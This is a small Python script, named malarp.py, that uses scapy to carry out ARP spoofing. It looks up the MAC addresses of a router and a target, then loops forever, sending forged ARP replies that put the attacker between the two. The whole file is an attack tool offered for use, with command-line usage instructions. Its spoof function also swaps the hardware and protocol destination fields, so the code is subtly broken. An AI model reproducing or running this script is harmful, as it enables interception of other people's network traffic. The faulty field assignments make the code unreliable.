import scapy.all as scapy #it is a tool with is build in the python library for arp
#before using the tool just go to terminal and type scapy and ensure that the tool is working or not 
import sys
import time 

def spoof(router_ip,target_ip,router_mac, target_mac):
    packet1 = scapy.ARP(op=2, hwdst= router_ip, pdst= router_mac , psrc=target_ip)
    packet2 = scapy.ARP(op=2, hwdst=target_ip, pdst = target_mac, psrc= router_ip)
    scapy.send(packet1)
    scapy.send(packet2)
    
    
    
def get_mac_addr(ipaddress):
    broadcast_layer = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_layer = scapy.ARP(pdst=ipaddress)
    get_mac_packet = broadcast_layer/arp_layer
    answer = scapy.srp(get_mac_packet, timeout = 2,verbose = False)[0]
    return answer[0][1].hwsrc    

target_ip = str(sys.argv[2])
router_ip = str(sys.argv[1])
target_mac = str(get_mac_addr(target_ip))
router_mac = str(get_mac_addr(router_ip))

try: 
    while True:
        spoof(router_ip,target_ip,router_mac, target_mac)
        time.sleep(2)
except: 
    print('Closing ARP Spoofer')
    exit(0)
# for using the above file just type : 
#python3 malarp.py <routersip> <targetip>

